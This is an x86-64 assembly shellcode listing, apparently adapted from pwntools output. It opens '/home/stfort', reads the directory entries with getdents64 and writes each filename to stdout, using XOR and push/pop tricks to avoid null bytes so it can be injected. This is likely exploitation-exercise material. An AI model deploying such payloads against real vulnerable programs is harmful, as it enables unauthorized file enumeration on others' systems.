BITS 64
;
; refitted python output
; 
SYS_write equ 1
SYS_open equ 2
SYS_getdents64 equ 217

    ; push b'/home/stfort\x00' 
    push 0x74726f66
    mov rax, 0x74732f656d6f682f
    push rax

    ; call open('rsp', 0x90800) 
    push SYS_open ; 2 
    pop rax
    mov rdi, rsp
    mov esi, 0x1010101 ; 591872 == 0x90800 
    xor esi, 0x1080901
    syscall

mov r15, rax
sub rsp, 1024
    ; call getdents64('r15', 'rsp', 0x400) 
    xor eax, eax
    mov al, SYS_getdents64 ; 0xd9 
    mov rdi, r15
    xor edx, edx
    mov dh, 0x400 >> 8
    mov rsi, rsp
    syscall

mov r15, rax ; r15 := size 
mov r9, rsp
add r9, r15 ; r9 := iteration_end 
mov r8, rsp ; r8 := iteration_start 
jmp check
_loop:
add r8, 16 ; skip d_ino and d_off 
movzx rdx, WORD [r8] ; rdi := d_reclen 
sub rdx, 19 ; subtract sizeof(d_ino) + sizeof(d_off) + sizeof(d_reclen) + sizeof(d_type) 
add r8, 3 ; skip d_reclen and d_type  
    ; call write(1, 'r8', 'rdx') 
    push SYS_write ; 1 
    pop rax
    push 1
    pop rdi
    mov rsi, r8
    syscall

add r8, rdx ; fixup pointer 
check:
cmp r9, r8
jg _loop

